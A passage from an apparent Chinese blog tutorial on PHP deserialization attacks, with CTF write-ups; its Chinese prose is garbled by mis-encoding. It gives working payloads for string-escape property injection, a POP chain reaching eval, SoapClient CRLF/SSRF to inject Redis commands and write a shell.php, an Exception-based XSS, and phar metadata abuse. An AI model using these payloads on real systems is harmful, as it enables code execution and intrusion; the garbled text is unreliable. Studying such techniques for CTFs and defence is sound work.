}</code></pre><p>è¦è¿›è¡Œå­—ç¬¦ä¸²çš„é€ƒé€¸åº”è¯¥å…ˆè€ƒè™‘ç”¨nicknameæ¥æ„é€ å­—ç¬¦ä¸²é€ƒé€¸photoåº”ä¸ºnicknameåœ¨å…¶å‰é¢<br>ç„¶åå‘ç°nicknameæœ‰æ­£åˆ™è¿‡æ»¤ï¼Œè€ƒè™‘ç”¨æ•°ç»„æ¥è¿›è¡Œç»•è¿‡</p><pre><code>if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)            die(&#39;Invalid nickname&#39;);</code></pre><p>æ•°ç»„ç»•è¿‡åå°±è€ƒè™‘è¿›è¡Œé€ƒé€¸å°†photoæŒ¤å‡ºå»<br>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ nicknameçš„å‚æ•°å€¼ä¸ºâ€;}s:5:â€photoâ€;s:10:â€config.phpâ€;}<br>è¿™é‡Œä¸ºä»€ä¹ˆè¦åœ¨å‰é¢åŠ ä¸€ä¸ª}å‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Œå› ä¸ºä¸ºäº†ç»•è¿‡nicknameçš„æ­£åˆ™åŒ¹é…æˆ‘ä»¬å°†å…¶æ„é€ æˆäº†æ•°ç»„ï¼Œæ•°ç»„åœ¨ååºåˆ—åŒ–è¦è¿›è¡Œé—­åˆï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹<br>æ„é€ ä»£ç </p><pre><code>&lt;?phpfunction filter($str){    return str_replace(&#39;bb&#39;, &#39;ccc&#39;, $str);}class A{    public $name=&#39;aaaa&#39;;    public $pass=&#39;123456&#39;;    public $nickname = array(&#39;a&#39; =&gt; &#39;Apple&#39; ,&#39;b&#39; =&gt; &#39;banana&#39; , &#39;c&#39; =&gt; &#39;Coconut&#39;);}$AA=new A();echo serialize($AA).&quot;\n&quot;;// $res=filter(serialize($AA));// $c=unserialize($res);// echo $c-&gt;pass;?&gt;</code></pre><p>è¿è¡Œç»“æœå‘ç°æ•°ç»„ä½ç½®è¿›è¡Œäº†é—­åˆ</p><p><img src="/images/pasted-41.png" alt="upload successful"><br>è¿™å°±æ˜¯ä¸ºå•¥ä¸Šé¢è¦å…ˆè¿›è¡Œ}åœ¨é€ƒé€¸<br>æ„é€ æˆ‘ä»¬æƒ³è¦çš„å†…å®¹åè¦è¿›è¡Œé€ƒé€¸ï¼Œæˆ‘ä»¬å‘ç°è¿‡æ»¤çš„æ—¶å€™å°†whereæ”¹æˆäº†hackerï¼Œè¿›è¡Œäº†å­—ç¬¦ä¸²æ‹“å±•å¢å»ºäº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬æ„é€ çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º34æ‰€ä»¥æˆ‘ä»¬è¦æ„é€ 34ä¸ªwhereè¿›è¡Œé€ƒé€¸</p><p><img src="/images/pasted-42.png" alt="upload successful"><br>ç„¶åæŸ¥çœ‹profile.phpçš„å›¾ç‰‡ï¼Œbase64è§£ç å°±è·å¾—äº†config.phpä¸­çš„flag</p><p><img src="/images/pasted-43.png" alt="upload successful"></p><h2 id="ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸-æ›¿æ¢åå¯¼è‡´å­—ç¬¦ä¸²å˜çŸ­"><a href="#ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸-æ›¿æ¢åå¯¼è‡´å­—ç¬¦ä¸²å˜çŸ­" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸(æ›¿æ¢åå¯¼è‡´å­—ç¬¦ä¸²å˜çŸ­)"></a>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸(æ›¿æ¢åå¯¼è‡´å­—ç¬¦ä¸²å˜çŸ­)</h2><p>å­—ç¬¦ä¸²å˜çŸ­çš„é€ƒé€¸ç±»ä¼¼äºå˜é•¿ï¼Œéƒ½æ˜¯åˆ©ç”¨äº†æ›¿æ¢å­—ç¬¦ä¸²å¯¼è‡´çš„å¯è¾“å…¥å˜é‡çš„æ”¹å˜ï¼Œä»è€Œå¯ä»¥é—­åˆ<br>æµ‹è¯•ä»£ç ï¼š</p><pre><code>&lt;?phpfunction str_rep($string){    return preg_replace( &#39;/php|test/&#39;,&#39;&#39;, $string);}$test[&#39;name&#39;] = $_GET[&#39;name&#39;];$test[&#39;sign&#39;] = $_GET[&#39;sign&#39;]; $test[&#39;number&#39;] = &#39;2020&#39;;$temp = str_rep(serialize($test));printf($temp);$fake = unserialize($temp);echo &#39;&lt;br&gt;&#39;;print(&quot;name:&quot;.$fake[&#39;name&#39;].&#39;&lt;br&gt;&#39;);print(&quot;sign:&quot;.$fake[&#39;sign&#39;].&#39;&lt;br&gt;&#39;);print(&quot;number:&quot;.$fake[&#39;number&#39;].&#39;&lt;br&gt;&#39;);?&gt;</code></pre><p>å‘ç°è¿›è¡Œäº†è¿‡æ»¤ï¼Œå°†phpå’Œtestè½¬æ¢ä¸ºç©º<br>å¦‚æœæˆ‘ä»¬åœ¨nameçš„å‚æ•°ä¸­è¾“å…¥phpï¼Œtestç­‰ï¼Œå°±æ¢è½¬æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆå°±ä¼šæŠŠåé¢çš„æ•°æ®å½“æˆå˜é‡<br>è€Œsignçš„å‚æ•°æ˜¯å¯æ§çš„ï¼Œå¦‚æœå½“nameå‚æ•°ä¸ºç©ºè€Œè¯»å–åˆ°signå¯æ§å‚æ•°å‰ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡signçš„å‚æ•°æ§åˆ¶å­—ç¬¦ä¸²ç”¨}å·æ¥é—­åˆæ‰åé¢çš„<br>è®¡ç®—â€;s:4:â€signâ€;s:51:â€çš„é•¿åº¦ä¸º19<br>è€Œè¿‡æ»¤phpä¸€ä¸ªèƒ½åæ‰3ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è¾“å…¥7ä¸ªphpä¹Ÿå°±æ˜¯åæ‰21é•¿åº¦ï¼Œè€Œåé¢æ˜¯19é•¿åº¦ï¼Œæ‰€ä»¥æˆ‘ä»¬åŠ 2ä¸ªå­—ç¬¦æ¥è¡¥å……<br>æ‰€ä»¥æ„é€ </p><pre><code>name=phpphpphpphpphpphpphpsign=12&quot;;s:4:&quot;sign&quot;;s:3:&quot;sjj&quot;;s:6:&quot;number&quot;;s:4:&quot;2222&quot;;}</code></pre><p>å…¶ä¸­signä¸­12ä¸ºè¡¥å……ä½¿å…¶ä¸º21é•¿åº¦ï¼Œâ€å·ç”¨äºé—­åˆnameå‚æ•°ï¼Œç„¶åå¯ä»¥å‘ç°ï¼Œnumberä¸å¯å˜å˜é‡è¢«æ”¹å˜</p><p><img src="/images/pasted-44.png" alt="upload successful"></p><h3 id="ä¸€ä¸ªctfä¾‹é¢˜-å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#ä¸€ä¸ªctfä¾‹é¢˜-å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="ä¸€ä¸ªctfä¾‹é¢˜([å®‰æ´µæ¯ 2019]easy_serialize_php)"></a>ä¸€ä¸ªctfä¾‹é¢˜([å®‰æ´µæ¯ 2019]easy_serialize_php)</h3><p>é¢˜ç›®åœ°å€:<a href="https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php" target="_blank" rel="noopener">https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php</a><br>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€æ®µä»£ç </p><pre><code> &lt;?php$function = @$_GET[&#39;f&#39;];function filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}if($_SESSION){    unset($_SESSION);}$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);if(!$function){    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;}if(!$_GET[&#39;img_path&#39;]){    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);}else{    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));}$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;){    highlight_file(&#39;index.php&#39;);}else if($function == &#39;phpinfo&#39;){    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!}else if($function == &#39;show_image&#39;){    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));} </code></pre><p><img src="/images/pasted-45.png" alt="upload successful"></p><p><img src="/images/pasted-46.png" alt="upload successful"><br>å…ˆçœ‹çœ‹phpinfoä¸­çš„æ•°æ®,æç¤ºåœ¨d0g3_f1ag.phpæ–‡ä»¶ä¸­</p><p><img src="/images/pasted-47.png" alt="upload successful"></p><pre><code>&lt;?php$_SESSION[&quot;user&quot;]=&#39;123&#39;;$_SESSION[&quot;function&quot;]=&#39;123&#39;;$_SESSION[&quot;img&quot;]=&#39;123&#39;;$Lmg = serialize($_SESSION);echo $Lmg.&quot;\n&quot;;?&gt;</code></pre><p>å…ˆæ„é€ ä»£ç å°è¯•è¿è¡Œç»“æœ</p><p><img src="/images/pasted-48.png" alt="upload successful"><br>å’Œä¸Šé¢åŸç†ä¸€æ ·è¦å°†åæ‰ï¼Œé•¿åº¦ä¸º23<br><code>&quot;;s:8:&quot;function&quot;;s:75:&quot;</code><br>ä¸ºä»€ä¹ˆs:åæ˜¯75å› ä¸ºsåçš„é•¿åº¦å¿…ç„¶å¤§äº10(ä¹Ÿå°±æ˜¯functionä¼ å…¥æ•°æ®çš„é•¿åº¦)æ‰€ä»¥æˆ‘ä»¬åªè¦å¤§äº10å°äº100éƒ½è¡Œï¼Œå› ä¸ºæ•°æ®é•¿åº¦ä¸å¯èƒ½å¤§äº100<br>è€Œflagæ¢æˆç©ºæ ¼åæ‰4ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¦6ä¸ªflag(å½“ç„¶ä¹Ÿå¯ä»¥8ä¸ªphp:3*8=24)ï¼Œç„¶åè¿˜æœ‰åœ¨functionå‚æ•°åŠ ä¸€ä¸ªå­—ç¬¦ä¸²æ¥æ»¡è¶³å24ä¸ªå­—ç¬¦ä¸²<br>æ‰€ä»¥æ„é€ æ•°å­—1ä¹Ÿå°±æ˜¯æ»¡è¶³24é•¿åº¦åŠ çš„ï¼Œimgå˜é‡è¦base64ï¼Œå› ä¸ºå®é™…çš„imgå‚æ•°è¢«æˆ‘ä»¬ç»™æŒ¤å‡ºå»äº†ï¼Œæ‰€è¯´<br><img src="/images/pasted-49.png" alt="upload successful">è¿™é‡Œä¸å½±å“<br>payloadï¼ˆpostä¼ è¾“ï¼‰ï¼š<br><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=1&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code><br>ç„¶åæŸ¥çœ‹æ˜¾ç¤ºï¼ŒæŸ¥çœ‹æºä»£ç ï¼š</p><p><img src="/images/pasted-50.png" alt="upload successful"><br>å°†imgå‚æ•°è¯»å–çš„æ–‡ä»¶æ”¹ä¸º/d0g3_fllllllagçš„base64åŠ å¯†<br>payloadï¼š<br><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=1&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;}</code></p><p><img src="/images/pasted-51.png" alt="upload successful"></p><h2 id="ååºåˆ—åŒ–popé“¾æ„é€ "><a href="#ååºåˆ—åŒ–popé“¾æ„é€ " class="headerlink" title="ååºåˆ—åŒ–popé“¾æ„é€ "></a>ååºåˆ—åŒ–popé“¾æ„é€ </h2><p>æœ‰æ—¶é‡è§é­”æ³•æ–¹æ³•ä¸­æ²¡æœ‰åˆ©ç”¨ä»£ç ï¼Œå³ä¸å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨å…¶ä»–ç±»æ–¹æ³•å’Œé­”æ³•å‡½æ•°æ¥è¾¾åˆ°ç›®çš„<br>ååºåˆ—åŒ–æƒ³æ„é€ çš„å‡ºçš„æ–¹æ³•<br>å‘½ä»¤æ‰§è¡Œï¼šexec()ã€passthru()ã€popen()ã€system()<br>æ–‡ä»¶æ“ä½œï¼šfile_put_contents()ã€file_get_contents()ã€unlink()</p><h3 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><p>ä»£ç :</p><pre><code>&lt;?phpclass lemon {    protected $ClassObj;    function __construct() {        $this-&gt;ClassObj = new normal();    }    function __destruct() {        $this-&gt;ClassObj-&gt;action();    }}class normal {    function action() {        echo &quot;hello&quot;;    }}class evil {    private $data;    function action() {        eval($this-&gt;data);    }}unserialize($_GET[&#39;d&#39;]);?&gt;</code></pre><p>lemonç±»åˆ›å»ºäº†æ­£å¸¸normalç±»ï¼Œç„¶åé”€æ¯æ—¶æ‰§è¡Œäº†action()æ–¹æ³•ï¼Œå¾ˆæ­£å¸¸ï¼Œä½†å¦‚æœè®©å…¶è°ƒç”¨evilç±»ï¼Œé”€æ¯æ—¶å€™å°±ä¼šè°ƒç”¨evilçš„action()æ–¹æ³•å‡ºç°evalæ–¹æ³•ï¼Œå°±èƒ½è¾¾åˆ°æ•ˆæœï¼Œæ‰€ä»¥éœ€è¦æ„é€ </p><pre><code>&lt;?phpclass lemon {    protected $ClassObj;    function __construct() {        $this-&gt;ClassObj = new evil();    }}class evil {    private $data = &quot;phpinfo();&quot;;}$lmg = new lemon();echo urlencode(serialize($lmg)).&quot;\n&quot;;?&gt;</code></pre><p>evilä¸­dataå‚æ•°ä¸ºç§æœ‰å±æ€§ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¼šå‡ºç°ä¸å¯å¤åˆ¶å­—ç¬¦ï¼Œéœ€è¿›è¡Œurlç¼–ç <br><code>O%3A5%3A%22lemon%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</code></p><p><img src="/images/pasted-52.png" alt="upload successful"><br>å…¶ä¸­phpinfo();å¯æ¢æˆå…¶ä»–æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤system(â€˜dirâ€™);ç­‰ç­‰</p><h2 id="phpååºåˆ—åŒ–åŸç”Ÿç±»åˆ©ç”¨"><a href="#phpååºåˆ—åŒ–åŸç”Ÿç±»åˆ©ç”¨" class="headerlink" title="phpååºåˆ—åŒ–åŸç”Ÿç±»åˆ©ç”¨"></a>phpååºåˆ—åŒ–åŸç”Ÿç±»åˆ©ç”¨</h2><p>ååºåˆ—æ²¡æœ‰åˆé€‚çš„åˆ©ç”¨é“¾ï¼Œéœ€è¦åˆ©ç”¨phpè‡ªå¸¦çš„åŸç”Ÿç±»</p><h3 id="callæ–¹æ³•"><a href="#callæ–¹æ³•" class="headerlink" title="__callæ–¹æ³•"></a>__callæ–¹æ³•</h3><p>__callæ–¹æ³•åœ¨è°ƒç”¨ä¸å­˜åœ¨ç±»çš„æ–¹æ³•æ—¶è§¦å‘<br>PHPä»£ç ï¼š</p><pre><code>&lt;?php$rce = unserialize($_GET[&#39;u&#39;]);echo $rce-&gt;notexist();echo $rce;?&gt;</code></pre><p>é€šè¿‡unserializeè¿›è¡Œååºåˆ—åŒ–ï¼Œè°ƒç”¨ä¸å­˜åœ¨notextist()ç±»ï¼Œå°†è§¦å‘<strong>call()é­”æ³•å‡½æ•°ã€‚<br>phpä¸­åŸç”Ÿç±»soapClientï¼Œå­˜åœ¨å¯ä»¥è¿›è¡Œ</strong>callé­”æ³•å‡½æ•°ã€‚<br>SOAPæ˜¯webServiceä¸‰è¦ç´ ï¼ˆSOAPã€WSDL(WebServicesDescriptionLanguage)ã€UDDI(UniversalDescriptionDiscovery andIntegration)ï¼‰ä¹‹ä¸€ï¼šWSDL ç”¨æ¥æè¿°å¦‚ä½•è®¿é—®å…·ä½“çš„æ¥å£ï¼Œ UDDIç”¨æ¥ç®¡ç†ï¼Œåˆ†å‘ï¼ŒæŸ¥è¯¢webService ï¼ŒSOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰æ˜¯è¿æ¥æˆ–WebæœåŠ¡æˆ–å®¢æˆ·ç«¯å’ŒWebæœåŠ¡ä¹‹é—´çš„æ¥å£ã€‚<br>å…¶é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ã€‚<br>phpä¸­çš„SoapClientç±»å¯ä»¥åˆ›å»ºsoapæ•°æ®æŠ¥æ–‡ï¼Œä¸wsdlæ¥å£è¿›è¡Œäº¤äº’ã€‚</p><p><img src="/images/pasted-53.png" alt="upload successful"><br>å…¶ä¸­optionå¯ä»¥å®šä¹‰ User-Agent</p><p><img src="/images/pasted-54.png" alt="upload successful"><br>payloadï¼š</p><pre><code>&lt;?php$rce = unserialize($_GET[&#39;u&#39;]);echo $rce-&gt;notexist();echo $rce;?&gt;</code></pre><p><strong>æ³¨æ„</strong>ï¼šè¦å¼€å¯soapï¼Œåœ¨php.iniä¸­å»é™¤extension=php_soap.dllä¹‹å‰çš„â€œ;â€ ï¼Œé‡å¯æœåŠ¡<br>payloadï¼š</p><pre><code>&lt;?php$lmg = serialize(new SoapClient(null, array(&#39;uri&#39;=&gt;&#39;http://192.168.124.133:8888/&#39;,&#39;location&#39;=&gt;&#39;http://192.168.124.133:8888/aaa/&#39;)));echo $lmg;?&gt;</code></pre><p>åœ°å€æ¢æˆè‡ªå·±æœåŠ¡å™¨åœ°å€<br>æˆ‘æ˜¯ç”¨è™šæ‹Ÿæœºubantuå¼€å¯çš„ç«¯å£<br>nc -l 8888<br>æ‰§è¡Œï¼š</p><p><img src="/images/pasted-55.png" alt="upload successful"></p><p><img src="/images/pasted-56.png" alt="upload successful"><br>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä¼ æ•°æ®è¿›è¡ŒCRLFï¼Œæ”»å‡»å†…ç½‘æœåŠ¡ï¼Œæ³¨å…¥rediså‘½ä»¤ï¼Œå› ä¸ºå¯å®šä¹‰user_agent<br>payloadï¼š</p><pre><code>&lt;?php    $lmg = serialize(new SoapClient(null, array(&#39;uri&#39;=&gt;&#39;http://192.168.124.133:8888/&#39;,&#39;location&#39;=&gt;&#39;http://192.168.124.133:8888/aaa/&#39;)));    // echo $lmg.&quot;\n&quot;;    $poc = &quot;CONFIG SET dir /root/&quot;;    $target = &quot;http://192.168.124.133:8888/&quot;;    $content = &quot;Content-Length:45\r\n\r\ndata=abc&quot;;    $b = new SoapClient(null, array(&#39;location&#39;=&gt;$target, &#39;user_agent&#39;=&gt;$content, &#39;uri&#39;=&gt;&#39;hello^^&#39;.$poc.&#39;^^hello&#39;));    $aaa = serialize($b);    $aaa = str_replace(&#39;^^&#39;, &quot;\n\r&quot;, $aaa);    echo $aaa.&quot;\n&quot;;    echo urlencode($aaa).&quot;\n&quot;;?&gt;</code></pre><p><img src="/images/pasted-57.png" alt="upload successful"></p><p><img src="/images/pasted-58.png" alt="upload successful"><br>å†…ç½‘ä¸­å†™shellï¼š<br>å†…ç½‘ä¸­test.php</p><pre><code>&lt;?php if($_SERVER[&#39;REMOTE_ADDR&#39;]==&#39;127.0.0.1&#39;){    echo &#39;hi&#39;;    @$a=$_POST[1];    @eval($a);} ?&gt;</code></pre><p>å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–ï¼ŒCRLFå†…ç½‘æ”»å‡»å†™shellï¼Œååºåˆ—åŒ–ä½ç½®</p><pre><code>&lt;?php$rce = unserialize($_GET[&#39;u&#39;]);echo $rce-&gt;notexist();echo $rce;?&gt;</code></pre><p>payloadï¼š</p><pre><code>&lt;?php$target = &#39;http://127.0.0.1/CTF/test.php&#39;;$post_string = &#39;1=file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: &#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;hello^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;%26&#39;,$aaa);echo urlencode($aaa);$c=unserialize(urldecode($aaa));// $c-&gt;ss();?&gt;</code></pre><p><img src="/images/pasted-59.png" alt="upload successful"><br><?php phpinfo();?>æˆåŠŸè¢«å†™å…¥shell.php</p><h3 id="toStringåŸç”Ÿç±»åˆ©ç”¨"><a href="#toStringåŸç”Ÿç±»åˆ©ç”¨" class="headerlink" title="__toStringåŸç”Ÿç±»åˆ©ç”¨"></a>__toStringåŸç”Ÿç±»åˆ©ç”¨</h3><p>æµ‹è¯•ä»£ç ï¼š</p><pre><code>&lt;?php    echo unserialize($_GET[&#39;u&#39;]);?&gt;</code></pre><p>åˆ©ç”¨payloadï¼š</p><pre><code>&lt;?php    echo urlencode(serialize(new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;)));?&gt;</code></pre><p>exceptionç±»å¯¹äºé”™è¯¯æ¶ˆæ¯æ²¡æœ‰ç»è¿‡ç¼–ç ï¼Œç›´æ¥è¾“å‡ºåˆ°äº†ç½‘é¡µï¼Œä¾¿å¯ä»¥é€ æˆxss</p><p><img src="/images/pasted-60.png" alt="upload successful"></p><h2 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h2><p>æ¥è‡ªSecarmaçš„å®‰å…¨ç ”ç©¶å‘˜Sam Thomaså‘ç°äº†ä¸€ç§æ–°çš„æ¼æ´åˆ©ç”¨æ–¹å¼ï¼Œå¯ä»¥åœ¨ä¸ä½¿ç”¨phpå‡½æ•°unserialize()çš„å‰æä¸‹ï¼Œå¼•èµ·ä¸¥é‡çš„phpå¯¹è±¡æ³¨å…¥æ¼æ´ã€‚<br>è¿™ä¸ªæ–°çš„æ”»å‡»æ–¹å¼è¢«ä»–å…¬å¼€åœ¨äº†ç¾å›½çš„BlackHatä¼šè®®æ¼”è®²ä¸Šï¼Œæ¼”è®²ä¸»é¢˜ä¸ºï¼šâ€ä¸ä¸ºäººæ‰€çŸ¥çš„phpååºåˆ—åŒ–æ¼æ´â€ã€‚å®ƒå¯ä»¥ä½¿æ”»å‡»è€…å°†ç›¸å…³æ¼æ´çš„ä¸¥é‡ç¨‹åº¦å‡çº§ä¸ºè¿œç¨‹ä»£ç æ‰§è¡Œã€‚æˆ‘ä»¬åœ¨RIPSä»£ç åˆ†æå¼•æ“ä¸­æ·»åŠ äº†å¯¹è¿™ç§æ–°å‹æ”»å‡»çš„æ£€æµ‹ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>pharæ–‡ä»¶ç»“æ„</p><ul><li>a stub<br>æ–‡ä»¶æ ¼å¼æ ‡å‡†ï¼Œæ ¼å¼ä¸ºxxx<?php xxx; __HALT_COMPILER();?>     å‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥__HALT_COMPILER();?&gt;ï¼Œå¦åˆ™æ— æ³•è¯†åˆ«æ˜¯ä¸æ˜¯pharæ–‡ä»¶ï¼Œå…¶ä¸­xxxå¯ä»¥ç”¨ä½œç»•è¿‡æ–‡ä»¶ä¸Šä¼ çš„æ£€æµ‹</li><li>a manifest describing the contents<br>pharæœ¬è´¨æ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå‹ç¼©æ–‡ä»¶çš„æƒé™ï¼Œå±æ€§ç­‰ä¿¡æ¯æ‰€å­˜æ”¾çš„ä½ç½®ï¼Œä»¥åºåˆ—çš„åŒ–çš„æ–¹æ³•å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œåœ¨ä½¿ç”¨phar://ä¼ªåè®®æ—¶ä¼šååºåˆ—åŒ–è¿™éƒ¨åˆ†ï¼Œæ¼æ´äº§ç”Ÿçš„åŸå› å°±åœ¨è¿™é‡Œ</li></ul><p><img src="/images/pasted-61.png" alt="upload successful"></p><ul><li>the file contents<br>è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹</li><li>[optional] a signature for verifying Phar integrity (phar file format only)<br>ç­¾åï¼Œæ–‡ä»¶æœ«å°¾ï¼Œæ ¼å¼ï¼š</li></ul><p><img src="/images/pasted-62.png" alt="upload successful"><br>phar://ä¼ªåè®®ä»‹ç»<br>è¿™ä¸ªå‚æ•°æ˜¯phpè§£å‹å‹ç¼©åŒ…çš„ä¸€ä¸ªå‡½æ•°ï¼Œä¸ç®¡ä»€ä¹ˆï¼Œéƒ½ä¼šå½“åšå‹ç¼©åŒ…æ¥è§£å‹<br>æµ‹è¯•ï¼š<br>è¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºoffï¼Œä¸ç„¶æ²¡æ³•ç”Ÿæˆpharæ–‡ä»¶<br>ç”¨æ¥åŒ…å«æŸä¸ªæ–‡ä»¶ï¼Œæ„å»ºç±»TestObjectï¼Œç„¶åææ„å‡½æ•°ç»“æŸæ—¶æ‰“å°dataæ•°æ®</p><pre><code>&lt;?phpclass TestObject{    function __destruct()    {        echo $this -&gt; data;   // TODO: Implement __destruct() method.    }}include($_GET[&#39;Lmg&#39;]);?&gt;</code></pre><p>ç”Ÿæˆpharæ–‡ä»¶ï¼Œä¸”å®šä¹‰çš„meta-dataçš„åºåˆ—åŒ–</p><pre><code>&lt;?php    class TestObject {    }    $phar = new Phar(&#39;phar.phar&#39;);    $phar -&gt; startBuffering();    $phar -&gt; setStub(&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);   //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´    $phar -&gt;addFromString(&#39;test.txt&#39;,&#39;test&#39;);  //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶    $object = new TestObject();    $object -&gt; data = &#39;Lmg&#39;;    $phar -&gt; setMetadata($object);  //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest    $phar -&gt; stopBuffering();?&gt;</code></pre><p>è¿è¡Œç”Ÿæˆæ–‡ä»¶ä¸ºpharçš„æ–‡ä»¶</p><p><img src="/images/pasted-63.png" alt="upload successful"><br>åœ¨çœŸå®æƒ…å†µï¼Œéœ€è¦ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œç„¶ååˆ©ç”¨pharåœ¨è§£å‹æ—¶ä¼šååºåŒ–meta-dataéƒ¨åˆ†æ¥è¾¾åˆ°ç›®çš„ï¼Œè¿™é‡Œå°±ç›´æ¥ç›´æ¥åŒ…å«äº†ï¼Œæ‰“å°äº†Lmgå­—ç¬¦ä¸²</p><p><img src="/images/pasted-64.png" alt="upload successful"><br>å—å½±å“çš„å‡½æ•°</p><p><img src="/images/pasted-65.png" alt="upload successful"><br>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>pharæ–‡ä»¶è¦èƒ½ä¸Šä¼ </li><li>æœ‰å¯åˆ©ç”¨å‡½æ•°å¦‚ä¸Šå›¾ï¼Œå¯é­”æ³•å‡½æ•°æ„é€ popé“¾</li><li>æ–‡ä»¶å‡½æ•°æ“ä½œå¯æ§ï¼Œ: / phar ç­‰æ²¡è¿‡è¢«è¿‡æ»¤<h3 id="ä¸€ä¸ªctfä¾‹å­-CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#ä¸€ä¸ªctfä¾‹å­-CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="ä¸€ä¸ªctfä¾‹å­([CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox)"></a>ä¸€ä¸ªctfä¾‹å­([CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox)</h3>é¢˜ç›®åœ°å€:<a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1]Dropbox" target="_blank" 